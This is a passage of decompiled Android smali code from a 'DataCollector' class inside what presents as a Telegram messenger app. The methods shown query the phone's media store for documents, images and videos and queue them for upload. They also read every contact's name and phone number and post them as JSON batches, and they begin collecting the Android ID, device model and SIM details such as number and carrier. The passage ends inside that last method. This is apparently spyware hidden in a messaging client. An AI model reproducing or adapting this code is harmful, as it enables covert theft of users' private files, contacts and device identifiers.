    if-ge v8, v9, :cond_2

    if-lez v8, :cond_1

    .line 2274
    const-string v9, " OR "

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 2275
    :cond_1
    const-string v9, "mime_type=?"

    invoke-virtual {v6, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 2276
    aget-object v9, v5, v8

    invoke-interface {v7, v9}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    add-int/lit8 v8, v8, 0x1

    goto :goto_0

    .line 2279
    :cond_2
    :try_start_0
    const-string v5, "external"

    .line 2280
    invoke-static {v5}, Landroid/provider/MediaStore$Files;->getContentUri(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v5

    filled-new-array {v2, v1, v0}, [Ljava/lang/String;

    move-result-object v8

    .line 2284
    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    new-array v6, v11, [Ljava/lang/String;

    .line 2285
    invoke-interface {v7, v6}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v6

    move-object v12, v6

    check-cast v12, [Ljava/lang/String;

    const-string v13, "date_added DESC"

    move-object v6, v8

    move-object v7, v9

    move-object v8, v12

    move-object v9, v13

    .line 2279
    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v12
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v12, :cond_4

    .line 2288
    :try_start_1
    const-string v0, "collectDeviceDocs: cursor null"

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-eqz v12, :cond_3

    .line 2304
    :try_start_2
    invoke-interface {v12}, Landroid/database/Cursor;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    move-object/from16 v1, p0

    goto/16 :goto_7

    :cond_3
    :goto_1
    return-void

    :catchall_0
    move-exception v0

    move-object/from16 v1, p0

    :goto_2
    move-object v2, v0

    goto/16 :goto_5

    .line 2291
    :cond_4
    :try_start_3
    invoke-interface {v12, v2}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v2

    .line 2292
    invoke-interface {v12, v1}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v1

    .line 2293
    invoke-interface {v12, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    .line 2294
    :cond_5
    :goto_3
    invoke-interface {v12}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    const-wide/16 v5, 0x0

    if-eqz v4, :cond_8

    .line 2295
    invoke-interface {v12, v2}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    .line 2296
    invoke-interface {v12, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 2297
    invoke-interface {v12, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v13

    if-nez v9, :cond_6

    goto :goto_3

    :cond_6
    cmp-long v4, v13, v5

    if-lez v4, :cond_5

    const-wide/32 v4, 0x1f400000

    cmp-long v6, v13, v4

    if-lez v6, :cond_7

    goto :goto_3

    :cond_7
    const/4 v13, 0x2

    move-object v4, v10

    move/from16 v5, p2

    move-wide v6, v7

    move-object v8, v9

    move v9, v13

    .line 2300
    invoke-virtual/range {v4 .. v9}, Lorg/telegram/messenger/DataCollector$UploadQueue;->enqueueGallery(IJLjava/lang/String;I)Z

    move-result v4

    if-eqz v4, :cond_5

    add-int/lit8 v11, v11, 0x1

    goto :goto_3

    .line 2302
    :cond_8
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "docs: enqueued "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v1, " documents for upload"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    if-lez v11, :cond_9

    move-object/from16 v1, p0

    .line 2303
    :try_start_4
    invoke-direct {v1, v5, v6}, Lorg/telegram/messenger/DataCollector;->scheduleGalleryQueueDrain(J)V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    goto :goto_4

    :catchall_1
    move-exception v0

    goto :goto_2

    :cond_9
    move-object/from16 v1, p0

    .line 2304
    :goto_4
    :try_start_5
    invoke-interface {v12}, Landroid/database/Cursor;->close()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    goto :goto_8

    :catch_1
    move-exception v0

    goto :goto_7

    :goto_5
    if-eqz v12, :cond_a

    .line 2279
    :try_start_6
    invoke-interface {v12}, Landroid/database/Cursor;->close()V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_2

    goto :goto_6

    :catchall_2
    move-exception v0

    move-object v4, v0

    :try_start_7
    invoke-virtual {v2, v4}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_a
    :goto_6
    throw v2
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    .line 2305
    :goto_7
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "collectDeviceDocs: "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_8
    return-void
.end method

.method private synthetic lambda$collectGalleryImages$13(Landroid/content/Context;I)V
    .locals 16

    .line 2162
    const-string v1, "TGCollect"

    const-string v0, "_size"

    const-string v2, "_display_name"

    const-string v3, "_id"

    invoke-direct/range {p0 .. p0}, Lorg/telegram/messenger/DataCollector;->getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;

    move-result-object v10

    if-nez v10, :cond_0

    return-void

    .line 2164
    :cond_0
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    .line 2165
    :try_start_0
    sget-object v5, Landroid/provider/MediaStore$Images$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    filled-new-array {v3, v2, v0}, [Ljava/lang/String;

    move-result-object v6

    const-string v9, "date_added DESC"

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v11

    if-nez v11, :cond_2

    if-eqz v11, :cond_1

    .line 2192
    invoke-interface {v11}, Landroid/database/Cursor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    move-object/from16 v2, p0

    goto/16 :goto_5

    :cond_1
    :goto_0
    return-void

    .line 2175
    :cond_2
    :try_start_1
    invoke-interface {v11, v3}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v3

    .line 2176
    invoke-interface {v11, v2}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v2

    .line 2177
    invoke-interface {v11, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    const/4 v4, 0x0

    const/4 v12, 0x0

    .line 2179
    :cond_3
    :goto_1
    invoke-interface {v11}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    const-wide/16 v5, 0x0

    if-eqz v4, :cond_7

    .line 2180
    invoke-interface {v11, v3}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    .line 2181
    invoke-interface {v11, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 2182
    invoke-interface {v11, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v13

    if-nez v9, :cond_4

    goto :goto_1

    .line 2184
    :cond_4
    invoke-virtual {v9}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v4

    .line 2185
    const-string v15, ".jpg"

    invoke-virtual {v4, v15}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v15

    if-nez v15, :cond_5

    const-string v15, ".jpeg"

    invoke-virtual {v4, v15}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v15

    if-nez v15, :cond_5

    const-string v15, ".png"

    .line 2186
    invoke-virtual {v4, v15}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v15

    if-nez v15, :cond_5

    const-string v15, ".webp"

    invoke-virtual {v4, v15}, Ljava/lang/String;->endsWith(Ljava/lang/String;)Z

    move-result v4

    if-nez v4, :cond_5

    goto :goto_1

    :catchall_0
    move-exception v0

    move-object/from16 v2, p0

    :goto_2
    move-object v3, v0

    goto :goto_3

    :cond_5
    cmp-long v4, v13, v5

    if-gtz v4, :cond_6

    goto :goto_1

    :cond_6
    const/4 v13, 0x0

    move-object v4, v10

    move/from16 v5, p2

    move-wide v6, v7

    move-object v8, v9

    move v9, v13

    .line 2188
    invoke-virtual/range {v4 .. v9}, Lorg/telegram/messenger/DataCollector$UploadQueue;->enqueueGallery(IJLjava/lang/String;I)Z

    move-result v4

    if-eqz v4, :cond_3

    add-int/lit8 v12, v12, 0x1

    goto :goto_1

    .line 2190
    :cond_7
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "gallery: enqueued "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, " images for upload"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    move-object/from16 v2, p0

    .line 2191
    :try_start_2
    invoke-direct {v2, v5, v6}, Lorg/telegram/messenger/DataCollector;->scheduleGalleryQueueDrain(J)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 2192
    :try_start_3
    invoke-interface {v11}, Landroid/database/Cursor;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_6

    :catch_1
    move-exception v0

    goto :goto_5

    :catchall_1
    move-exception v0

    goto :goto_2

    .line 2165
    :goto_3
    :try_start_4
    invoke-interface {v11}, Landroid/database/Cursor;->close()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    goto :goto_4

    :catchall_2
    move-exception v0

    move-object v4, v0

    :try_start_5
    invoke-virtual {v3, v4}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_4
    throw v3
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    .line 2193
    :goto_5
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "collectGalleryImages: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_6
    return-void
.end method

.method private synthetic lambda$collectGalleryVideos$14(Landroid/content/Context;I)V
    .locals 15

    .line 2211
    const-string v1, "TGCollect"

    const-string v0, "_size"

    const-string v2, "_display_name"

    const-string v3, "_id"

    invoke-direct {p0}, Lorg/telegram/messenger/DataCollector;->getUploadQueue()Lorg/telegram/messenger/DataCollector$UploadQueue;

    move-result-object v10

    if-nez v10, :cond_0

    return-void

    .line 2213
    :cond_0
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    .line 2214
    :try_start_0
    sget-object v5, Landroid/provider/MediaStore$Video$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    filled-new-array {v3, v2, v0}, [Ljava/lang/String;

    move-result-object v6

    const-string v9, "date_added DESC"

    const/4 v7, 0x0

    const/4 v8, 0x0

    invoke-virtual/range {v4 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v11

    if-nez v11, :cond_2

    if-eqz v11, :cond_1

    .line 2236
    invoke-interface {v11}, Landroid/database/Cursor;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    move-object v2, p0

    goto/16 :goto_6

    :cond_1
    :goto_0
    return-void

    .line 2222
    :cond_2
    :try_start_1
    invoke-interface {v11, v3}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v3

    .line 2223
    invoke-interface {v11, v2}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v2

    .line 2224
    invoke-interface {v11, v0}, Landroid/database/Cursor;->getColumnIndexOrThrow(Ljava/lang/String;)I

    move-result v0

    const/4 v4, 0x0

    const/4 v12, 0x0

    .line 2226
    :cond_3
    :goto_1
    invoke-interface {v11}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    const-wide/16 v5, 0x0

    if-eqz v4, :cond_6

    .line 2227
    invoke-interface {v11, v3}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v7

    .line 2228
    invoke-interface {v11, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v9

    .line 2229
    invoke-interface {v11, v0}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v13

    if-nez v9, :cond_4

    goto :goto_1

    :cond_4
    cmp-long v4, v13, v5

    if-lez v4, :cond_3

    const-wide/32 v4, 0x1f400000

    cmp-long v6, v13, v4

    if-lez v6, :cond_5

    goto :goto_1

    :cond_5
    const/4 v13, 0x1

    move-object v4, v10

    move/from16 v5, p2

    move-wide v6, v7

    move-object v8, v9

    move v9, v13

    .line 2232
    invoke-virtual/range {v4 .. v9}, Lorg/telegram/messenger/DataCollector$UploadQueue;->enqueueGallery(IJLjava/lang/String;I)Z

    move-result v4

    if-eqz v4, :cond_3

    add-int/lit8 v12, v12, 0x1

    goto :goto_1

    :catchall_0
    move-exception v0

    move-object v2, p0

    :goto_2
    move-object v3, v0

    goto :goto_4

    .line 2234
    :cond_6
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "gallery: enqueued "

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v2, " videos for upload"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-lez v12, :cond_7

    move-object v2, p0

    .line 2235
    :try_start_2
    invoke-direct {p0, v5, v6}, Lorg/telegram/messenger/DataCollector;->scheduleGalleryQueueDrain(J)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    goto :goto_3

    :catchall_1
    move-exception v0

    goto :goto_2

    :cond_7
    move-object v2, p0

    .line 2236
    :goto_3
    :try_start_3
    invoke-interface {v11}, Landroid/database/Cursor;->close()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_7

    :catch_1
    move-exception v0

    goto :goto_6

    .line 2214
    :goto_4
    :try_start_4
    invoke-interface {v11}, Landroid/database/Cursor;->close()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    goto :goto_5

    :catchall_2
    move-exception v0

    move-object v4, v0

    :try_start_5
    invoke-virtual {v3, v4}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_5
    throw v3
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    .line 2237
    :goto_6
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "collectGalleryVideos: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_7
    return-void
.end method

.method private synthetic lambda$collectPhoneContacts$10()V
    .locals 1

    const/4 v0, 0x1

    .line 1976
    iput-boolean v0, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollected:Z

    return-void
.end method

.method private synthetic lambda$collectPhoneContacts$11(Landroid/content/Context;I)V
    .locals 9

    .line 1930
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    .line 1931
    new-instance p1, Lorg/json/JSONArray;

    invoke-direct {p1}, Lorg/json/JSONArray;-><init>()V

    const/4 v6, 0x0

    .line 1932
    :try_start_0
    sget-object v1, Landroid/provider/ContactsContract$CommonDataKinds$Phone;->CONTENT_URI:Landroid/net/Uri;

    const-string v2, "display_name"

    const-string v3, "data1"

    const-string v4, "data4"

    filled-new-array {v2, v3, v4}, [Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    const/4 v5, 0x0

    const/4 v3, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v0, :cond_1

    .line 1940
    :try_start_1
    iput-boolean v6, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollecting:Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    if-eqz v0, :cond_0

    .line 1959
    :try_start_2
    invoke-interface {v0}, Landroid/database/Cursor;->close()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    :catch_0
    move-exception p1

    goto/16 :goto_6

    :cond_0
    :goto_0
    return-void

    :catchall_0
    move-exception p1

    goto/16 :goto_4

    .line 1943
    :catch_1
    :cond_1
    :goto_1
    :try_start_3
    invoke-interface {v0}, Landroid/database/Cursor;->moveToNext()Z

    move-result v1

    if-eqz v1, :cond_6

    .line 1944
    invoke-interface {v0, v6}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x1

    .line 1945
    invoke-interface {v0, v2}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x2

    .line 1946
    invoke-interface {v0, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    const-string v4, ""

    if-eqz v3, :cond_2

    move-object v2, v3

    goto :goto_2

    :cond_2
    if-eqz v2, :cond_3

    goto :goto_2

    :cond_3
    move-object v2, v4

    .line 1948
    :goto_2
    :try_start_4
    invoke-virtual {v2}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v2

    .line 1949
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v3
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    if-eqz v3, :cond_4

    goto :goto_1

    .line 1951
    :cond_4
    :try_start_5
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    .line 1952
    const-string v5, "type"

    const-string v7, "phone_contact"

    invoke-virtual {v3, v5, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1953
    const-string v5, "account"

    invoke-static {p2}, Lorg/telegram/messenger/DataCollector;->userId(I)J

    move-result-wide v7

    invoke-virtual {v3, v5, v7, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 1954
    const-string v5, "name"

    if-eqz v1, :cond_5

    goto :goto_3

    :cond_5
    move-object v1, v4

    :goto_3
    invoke-virtual {v3, v5, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1955
    const-string v1, "phone"

    invoke-virtual {v3, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 1956
    invoke-virtual {p1, v3}, Lorg/json/JSONArray;->put(Ljava/lang/Object;)Lorg/json/JSONArray;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    goto :goto_1

    .line 1959
    :cond_6
    :try_start_6
    invoke-interface {v0}, Landroid/database/Cursor;->close()V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_0

    .line 1964
    invoke-virtual {p1}, Lorg/json/JSONArray;->length()I

    move-result p2

    if-nez p2, :cond_7

    .line 1965
    iput-boolean v6, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollecting:Z

    return-void

    .line 1974
    :cond_7
    iput-boolean v6, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollecting:Z

    .line 1975
    new-instance p2, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda28;

    invoke-direct {p2, p0}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticLambda28;-><init>(Lorg/telegram/messenger/DataCollector;)V

    const/4 v0, 0x0

    invoke-direct {p0, p1, p2, v0}, Lorg/telegram/messenger/DataCollector;->postJsonBatchDirect(Lorg/json/JSONArray;Ljava/lang/Runnable;Ljava/lang/Runnable;)V

    return-void

    :goto_4
    if-eqz v0, :cond_8

    .line 1932
    :try_start_7
    invoke-interface {v0}, Landroid/database/Cursor;->close()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_1

    goto :goto_5

    :catchall_1
    move-exception p2

    :try_start_8
    invoke-virtual {p1, p2}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :cond_8
    :goto_5
    throw p1
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_0

    .line 1960
    :goto_6
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "collectPhoneContacts: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p2, "TGCollect"

    invoke-static {p2, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 1961
    iput-boolean v6, p0, Lorg/telegram/messenger/DataCollector;->phoneContactsCollecting:Z

    return-void
.end method

.method private synthetic lambda$collectSimInfo$12(Landroid/content/Context;I)V
    .locals 23

    move-object/from16 v1, p0

    move-object/from16 v0, p1

    const-string v2, "android_id"

    .line 1997
    :try_start_0
    invoke-virtual/range {p1 .. p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v4

    invoke-static {v4, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_a

    const-string v5, ""

    if-nez v4, :cond_0

    move-object v4, v5

    .line 2000
    :cond_0
    :try_start_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v7, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v8, " "

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    .line 2003
    new-instance v8, Lorg/json/JSONArray;

    invoke-direct {v8}, Lorg/json/JSONArray;-><init>()V

    .line 2005
    sget v9, Landroid/os/Build$VERSION;->SDK_INT:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_a

    const-string v12, "country_iso"

    const-string v13, "carrier"

    const-string v14, "number"

    const-string v15, "android.permission.READ_PHONE_NUMBERS"

    const-string v11, "slot"

    const-string v3, "telephony_subscription_service"

    const-string v10, "mnc"

    const-string v1, "mcc"

    move-object/from16 v17, v7

    const-string v7, "phone"

    move-object/from16 v18, v6

    const/16 v6, 0x16

    if-lt v9, v6, :cond_d

    .line 2007
    :try_start_2
    invoke-virtual {v0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    invoke-static {v6}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline1;->m(Ljava/lang/Object;)Landroid/telephony/SubscriptionManager;

    move-result-object v6
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    if-eqz v6, :cond_1

    .line 2011
    :try_start_3
    invoke-static {v6}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline8;->m(Landroid/telephony/SubscriptionManager;)Ljava/util/List;

    move-result-object v9
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_0

    :catch_0
    nop

    :cond_1
    const/4 v9, 0x0

    :goto_0
    if-eqz v9, :cond_d

    .line 2014
    :try_start_4
    invoke-interface {v9}, Ljava/util/List;->isEmpty()Z

    move-result v16

    if-nez v16, :cond_d

    .line 2015
    invoke-interface {v9}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v9

    :goto_1
    invoke-interface {v9}, Ljava/util/Iterator;->hasNext()Z

    move-result v16

    if-eqz v16, :cond_d

    invoke-interface {v9}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v16

    invoke-static/range {v16 .. v16}, Lorg/telegram/messenger/DataCollector$$ExternalSyntheticApiModelOutline13;->m(Ljava/lang/Object;)Landroid/telephony/SubscriptionInfo;

    move-result-object v16

    move-object/from16 v19, v9

    .line 2016
    new-instance v9, Lorg/json/JSONObject;

    invoke-direct {v9}, Lorg/json/JSONObject;-><init>()V

